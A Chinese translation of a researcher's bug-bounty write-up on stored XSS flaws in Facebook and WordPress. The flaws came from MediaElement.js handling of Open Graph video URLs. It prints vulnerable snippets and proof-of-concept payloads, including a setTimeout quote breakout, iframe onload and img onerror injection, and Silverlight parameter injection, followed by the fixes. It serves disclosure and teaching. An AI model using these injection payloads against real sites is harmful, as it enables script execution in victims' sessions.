> 原文链接: https://www.anquanke.com//post/id/101419 


# FaceBook的存储型XSS漏洞


                                阅读量   
                                **102266**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者default_user，文章来源：opnsec.com
                                <br>原文地址：[https://opnsec.com/2018/03/stored-xss-on-facebook/](https://opnsec.com/2018/03/stored-xss-on-facebook/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t016e13b161a77ccddf.png)](https://p3.ssl.qhimg.com/t016e13b161a77ccddf.png)



## 介绍

我在2017年4月报告了多个FaceBook wall上的存储型XSS。这些存储型XSS漏洞也出现在WordPress中，所以我在发布这篇文章之前等待WordPress进行修补。这些漏洞现已在WordPress上修复！

这些XSS有点复杂，因为它们需要多个步骤，但是每一步本身都很容易理解。



## Open Graph协议

当您在Facebook帖子中添加URL时，Facebook将使用[Open Graph协议](http://ogp.me/) （[FB doc](https://developers.facebook.com/docs/sharing/webmasters/)）显示丰富的内容。以下是关于Facebook如何使用OG在FB帖子中嵌入外部内容的大致流程：
1. 攻击者在FB帖子上发布URL
1. FB服务器读取URL（服务器端）并读取OG meta标签中提取有关URL内容的信息（例如，内容是带有标题，封面图像，视频编码类型和视频文件URL的视频）
1. 受害者查看带有封面图片和播放按钮FB帖子
<li>当受害者点击播放按钮时，视频会使用从OG元标记中提取的视频信息加载。**（XSS将在这里执行）**
</li>
> 许多网站也使用OG工作流，包括Twitter和WordPress等。
<p>步骤#2很敏感：服务器端读取用户提供的URL，这通常会导致SSRF。<br>
如果托管网站在敏感网页上使用X-Frame-Options：SAMEORIGIN并允许攻击者在同一子域中注入任意iframe，则会造成潜在的点击劫持漏洞。</p>
FB不容易受到这些问题的影响

有趣的部分在步骤#4：在受害者点击播放按钮后，FB加载视频时。首先，FB会发送一个XHR请求来获取视频类型和视频文件URL，它们都是由攻击者在ogvideo：type（我们称之为ogVideoType）和og：video：secure_url（ogVideoUrl ）由攻击者发布的URL的标签。以下是OG元标记的示例：

```
&lt;!DOCTYPE html&gt;

&lt;html&gt;

&lt;head&gt;

&lt;meta property="og:video:type" content="video/flv"&gt;

&lt;meta property="og:video:secure_url" content='https://example.com/video.flv'&gt;

&lt;meta property="og:video:width" content="718"&gt;

&lt;meta property="og:video:height" content="404"&gt;

&lt;meta property="og:image" content="https://example.com/cover.jpg"&gt;

(...)

&lt;/head&gt;

&lt;body&gt;

(...)
&lt;/body&gt;

&lt;/html&gt;
```

If ogVideoType is “iframe” or “swf player” then FB loads an external iframe and doesn’t handle the playing of the video. Otherwise, FB was using [MediaElement.js](http://www.mediaelementjs.com/)to handle the loading of the video directly on facebook.com. I already reported and [disclosed vulnerabilities](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/) on the Flash component of ME.js on both Facebook and WordPress.

如果ogVideoType是“iframe”或“swf player”，则FB会加载一个外部iframe并且不处理该视频的播放，而是直接使用[MediaElement.js](http://www.mediaelementjs.com/)在facebook.com上处理视频加载。我已经报告并[披露](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)了ME.js的Flash组件在Facebook 和WordPress上的[漏洞](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)。



## 1.使用FlashMediaElement.swf造成的存储型XSS

MediaElements.js根据ogVideoType会有多种播放视频的方式。

如果ogVideoType是“video / flv”（flash视频），则Facebook在facebook.com上加载Flash文件FlashMediaElement.swf（使用&lt;embed&gt;标签），并将ogVideoUrl传递到FlashME.swf进行视频播放。FlashME.swf然后将日志信息发送到facebook.com（使用Flash-to-JavaScript）关于“视频播放”或“视频结束”等事件。FlashME.swf正确处理了Flash-to-JavaScript的通信，特别是被正确转义为**\**以避免XSS。

但是，发送的JavaScript代码是：

```
setTimeout('log("[VIDEO_URL]")', 0)
```

> 在Javascript中setTimeout与eval类似，它会将字符串转换为指令，使其非常危险

[VIDEO_URL]由攻击者控制，它是ogVideoUrl的值。如果它包含**“**例如

```
http://evil.com/video.flv?"[payload]
```

Flash会将以下指令发送给javascript：

```
setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);
```

如您所见，**“** in **video.flv？”payload**已正确转义，因此攻击者无法逃离setTimeout函数。

但是，当JavaScript执行setTimeout函数时，它将执行以下JavaScript指令：

```
log("http://evil.com/video.flv?"[payload]")

```

而这次**“**不再逃脱，攻击者可以注入XSS！

现在的问题是，Facebook在将ogVideoUrl传递给FlashME.swf之前是否会转义l。

首先，Facebook JavaScript向Facebook服务器发送XHR请求以获取ogVideoType和ogVideoUrl的值。ogVideoUrl的值是正确编码的，但它可以包含任何特殊字符，例如：

```
https://evil.com?"'&lt;
```

然后，在发送到Flash之前，ogVideoUrl进行了如下转换：

```
function absolutizeUrl(ogVideoUrl) `{`
var tempDiv = document.createElement('div');
tempDiv.innerHTML = '&lt;a href="' + ogVideoUrl.toString().split('"').join('&amp;quot;') + '"&gt;x&lt;/a&gt;';
return tempDiv.firstChild.href;
`}`flashDiv.innerHTML ='&lt;embed src="FlashME.swf?videoFile=' + encodeURI(absolutizeUrl(ogVideoUrl )) +'" type="application/x-shockwave-flash"&gt;';
```

absolutizeUrl（ogVideoUrl）的结果 在发送到Flash之前进行了URL编码，但当Flash接收到数据时，它会自动对其进行URL解码，因此我们可以忽略encodeURI指令。

absolutizeUrl使用当前的javascript上下文的协议和域(Domain)来将相对URL转换为绝对URL（如果提供了绝对URL，则返回它几乎不变）。这似乎是“哈克”，但它看起来足够安全和简单，因为我们让浏览器做了艰苦的工作。但当存在特殊字符编码时，这并不简单。

当最初分析这段代码时，我使用的是Firefox，因为它有很棒的扩展，比如Hackbar，Tamper Data和Firebug！

在Firefox中，如果你尝试

```
absolutizeUrl('http://evil.com/video.flv#"payload')
```

它会返回

```
http://evil.com/video.flv#%22payload
```

所以我被难住了，因为在Facebook中，由Flash发送的JavaScript指令会是

```
setTimeout("log(\"http://evil.com/video.flv?%22payload\")", 0);
```

这将导致

```
log("http://evil.com/video.flv?%22[payload]")
```

这不是一个XSS。

然后我尝试了Chrome和

```
absolutizeUrl('http://evil.com/video.flv#"payload')
```

返回：

```
http://evil.com/video.flv#"payload
```

和 o / YEAH !!!!!

现在Flash发送

```
setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);
```

到Facebook的JavaScript和哪些将导致

```
log("http://evil.com/video.flv?"[payload]")

```

所以如果ogVideoUrl设置为

```
http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"
```

那么Facebook将执行

```
log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"")
```

并会显示一个不错的小警告框，说“facebook.com XSSed！” 🙂

> 这是由于浏览器解析URL时，不同的浏览器在特殊字符编码上有所不同：
<ul>
- Firefox将对URL中出现的任何双引号(“)进行URL编码
- Chrome浏览器（最高版本为64）将除了URL 的hash部分（=fragment
- ）外的双引号(“)进行URL编码。（请注意：在Chrome的最新版本65中，此行为已更改，现在Chrome的行为与Firefox相同，在hash中的双引号（”）也会进行编码）
- IE和Edge将不会URL编码在hash部分或者URL 的搜索部分（=query）中的双引号
- Safari将不会URL编码在hash部分的双引号(“)
</ul>
正如你所看到的让浏览器决定如何在JavaScript代码中的URL中进行特殊字符编码并不是很好！

我立即将此漏洞报告给Facebook，他们在第二天回复并告诉我他们修改了Flash文件，以便它不再使用setTimeout，Flash现在会发送

```
log("http://evil.com/video.flv?\"payload")
```

正如你所看到的**“**正确地转义到**”**，所里这里不再有XSS。



## 2.无Flash存储XSS

上面的的XSS需要Flash，所以我检查这里能否有一个不使用Flash的payload。

如果ogVideoType是“video / vimeo”，则会执行以下代码

```
ogVideoUrl = absolutizeUrl(ogVideoUrl);ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);playerDiv.innerHTML = '&lt;iframe src="https://player.vimeo.com/video/' + ogVideoUrl + '?api=1"&gt;&lt;/iframe&gt;';
```

正如你可以看到 absolutizeUrl（ogURL）在注入playerDiv.innerHTML之前没有被urlencoded，所以当ogVideoUrl设置为

```
http://evil.com/#" onload="alert(document.domain)"
```

playerDiv.innerHTML则会变为：

```
&lt;iframe src="https://player.vimeo.com/video/#" onload="alert(document.domain)" ?api=1"&gt;&lt;/iframe&gt;
```

这又是Facebook.com上的XSS！

我在前一个XSS被修复的同一天报道了这一点，Facebook在同一天用如下方法修复了漏洞：

```
ogVideoUrl = absolutizeUrl(ogVideoUrl);ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);playerDiv.innerHTML = '&lt;iframe src="https://player.vimeo.com/video/' + ogVideoUrl.split('"').join('&amp;quot;') + '?api=1"&gt;&lt;/iframe&gt;'
```

以下是这个XSS的视频：<br><video src="http://rs-beijing.oss.yunpan.360.cn/Object.getFile/anquanke/RmFjZWJvb2sgWFNTLm1wNA==" controls="controls" width="400" height="400"><br>
您的浏览器不支持video标签﻿<br></video>



第二天，我发现了另一个易受攻击的点：当ogVideoType是未知的类型，比如“video / nothing”时，Facebook会显示一条包含ogVideoUrl链接的错误消息，如下所示：

```
errorDiv.innerHTML = '&lt;a href="' +absolutizeUrl(ogVideoUrl ) + '"&gt;'
```

所以ogVideoUrl 的payload设置为

```
https://opnsec.com/#"&gt;&lt;img/src="xxx"onerror="alert(document.domain)
```

errorDiv.innerHTML则会变为：

`&lt;a href="https://opnsec.com/#"&gt;&lt;img src="xxx" onerror="alert(document.domain)"&gt;`

我把它报告给了Facebook，非常欢乐的是，来自Facebook的白帽子Neil告诉我，他计划在第二天检查这些代码！



## 哦，还有一件事…

另一种可能的ogVideoType是“silverlight”。[Silverlight](https://www.microsoft.com/silverlight/) 是微软公司的浏览器插件，它能与VBscript交互，就像Flash和JavaScript交互。

在Facebook（silverlightmediaelement.xap）上托管的silverlight文件是这样加载的：

```
params = ["file=" + ogVideoUrl, "id=playerID"];silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="' + params.join(',').split('"').join('&amp;quot;') + '" /&gt;&lt;/object&gt;';
```

silverlightmediaelement.xap然后会发送日志信息到Facebook的JavaScript（这点有点像Flash），但这次它不包含ogVideoUrl，但只有player ID，这是另一个在initParams中发送由Facebook定义的参数。Silverlight会调用javascript函数**[id] _init（）** ，其中[id]是“playerID”。

在Silverlight中，参数不是由 URLs或Flash中的**＆**所分隔，而是通过**逗号(,)**

如果ogVideoUrl 包含一个**逗号( ，)**那么在这个**逗号**后面的每一个东西都将被silverlight视为另一个参数，这意味着使用有效载荷

```
https://opnsec.com/#,id=alert(document.domain)&amp;
```

然后silverlight像这样加载：

```
silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="file=https://opnsec.com/#,id=alert(document.domain)&amp;,id=playerID" /&gt;&lt;/object&gt;';
```

Silverlight将仅考虑id的第一次出现，并将其值设置为

```
alert(document.domain)&amp;
```

然后Silverlight将调用以下javascript：

```
alert(document.domain)&amp;_init()
```

这意味着再次 XSS！

我在同一天进行了提交，Neal回复说他们将删除所有MediaElement组件，并用一种处理外部视频的新方式替换它！



## 那么WordPress呢？

所有这些存在问题的代码都不是由Facebook开发的，他们使用了可以将视频嵌入到网页中 [MediaElementjs](http://www.mediaelementjs.com/) 库，它是一个流行的（现在依旧是，尤其是因为它们具有支持旧版浏览器的Flash后备功能）开源模块。特别是，WordPress在处理[短代码](https://codex.wordpress.org/Shortcode_API)时默认使用这个模块。这些漏洞也存在于WordPress中，并能够在WordPress评论或作者写的WordPress文章中写入存储XSS（在WordPress中，作者角色不允许执行JavaScript）。

我向WordPress报告了漏洞，几个月之前我已经报告过[其他漏洞](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/) 。他们向MediaElementjs团队通报了这一消息，并告诉我他们正在进行修复。在2018年2月，他们终于发布了与MediaElementjs相关的所有XSS的修复程序。



## 结论

我学到了很多东西，并且发现这些漏洞非常有趣。我希望你也喜欢它！

以下是一些建议：

> Open Graph（以及像json-ld这样的替代品）是在网站上显示丰富的外部内容的好方法，但你应该小心使用（认为SSRF，XSS和Clickjacking）
不要让浏览器在您的JavaScript代码中为您解析URL，每个浏览器都以自己的方式处理它，并且浏览器可以随时更改其行为（如Chrome 64 – &gt; 65）。应该改为使用白名单正则表达式。
现在的自动工具不会检测到使用XHR，DOM突变和外部内容的复杂动态XSS。所以即使是最安全，最有影响力的网站也可能会受到攻击。代码审查和调试是实现这些目标的方法！
不要害怕大的、压缩过、动态的JavaScript源代码。如果您在网站上发现一些潜在的危险功能，您可以放轻松的检查它是如何实现的。
Facebook WhiteHat是一个非常好的漏洞奖励计划！感谢Neal及其团队


